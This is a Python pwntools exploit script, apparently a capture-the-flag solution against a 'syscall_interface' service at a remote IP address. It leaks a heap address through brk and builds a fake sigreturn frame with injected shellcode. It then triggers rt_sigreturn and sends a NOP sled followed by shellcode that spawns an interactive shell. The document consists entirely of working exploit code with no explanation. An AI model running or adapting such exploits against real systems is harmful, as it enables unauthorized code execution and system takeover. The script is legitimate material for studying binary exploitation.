from pwn import *
context.arch = 'amd64'

data = [0x0]*16
#r = process(["./syscall_interface"])
r = remote("139.180.144.86", 20004)
#r = remote("localhost",4444)
r.sendafter("choice:","0".ljust(0xf,'\x00'))
r.sendafter(":","135".ljust(0xf,'\x00'))
r.sendafter(":",str(0x400000).ljust(0x1f,'\x00'))

r.sendafter("choice:","0".ljust(0xf,'\x00'))
r.sendafter(":","12".ljust(0xf,'\x00'))
r.sendafter(":",str(0x0).ljust(0x1f,'\x00'))

r.recvuntil("RET(")
heap = int(r.recvuntil(")")[:-1],16)-0x22000
print hex(heap)


data[0] = u64(asm("push rsp;pop rsi;syscall").ljust(8,'\x90'))
data[2] = 0x200

data[5] = heap+0x8
data[6] = heap+0x40
data[0x8] = 0x002b000000000033


payload = flat(data)[:0x7f]
r.sendafter(":","1".ljust(0xf,'\x00'))
r.sendafter(":",payload)

r.sendafter("choice:","0".ljust(0xf,'\x00'))
r.sendafter(":","12".ljust(0xf,'\x00'))
r.sendafter(":",str(0x0).ljust(0x1f,'\x00'))

r.sendafter("choice:","0".ljust(0xf,'\x00'))
r.sendafter(":","15".ljust(0xf,'\x00'))

r.sendafter(":",str(0x0).ljust(0x1f,'\x00'))
r.send("\x90"*0x50+asm("add rsp,0x500")+asm(shellcraft.sh()))

r.interactive()
